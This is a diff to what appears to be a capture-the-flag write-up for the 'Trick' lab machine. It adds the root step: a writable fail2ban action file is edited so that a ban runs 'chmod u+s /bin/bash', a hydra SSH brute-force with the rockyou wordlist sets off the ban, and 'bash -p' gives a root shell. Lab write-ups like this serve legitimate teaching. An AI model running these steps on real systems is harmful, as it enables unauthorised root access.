@@ -586,11 +586,66 @@ michael@trick:/etc/fail2ban/action
 ```
 ### Exploitation
 
-Step-by-step privilege escalation.
+copy the `iptables-multiport.conf ` in the home directory:
+
+```
+michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
+```
+
+```
+michael@trick:~$ nano iptables-multiport.conf
+```
+
+edit this line to the set the `SUID` on /bin/bash:
 
 ```shell
 actionban = chmod u+s /bin/bash    
 #actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+```
+
+replace the og file:
+
+```
+michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
+mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y
+
+```
+
+```
+michael@trick:~$ sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+```
+
+on kali:
+```
+hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 09:44:44
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.129.137.188:22/
+[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344175 to do in 1057:50h, 14 active
+[STATUS] 192.00 tries/min, 576 tries in 00:03h, 14343828 to do in 1245:08h, 11 active
+
+
+
+```
+
+## Root flag
+
+```
+michael@trick:~$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+michael@trick:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+michael@trick:~$ /bin/bash -p
+bash-5.0# id
+uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
+bash-5.0# cat /root/root.txt
+7bcc6d11dcc64672dd4d8e8c103c4591
+bash-5.0# 
+
 ```
 
 ---
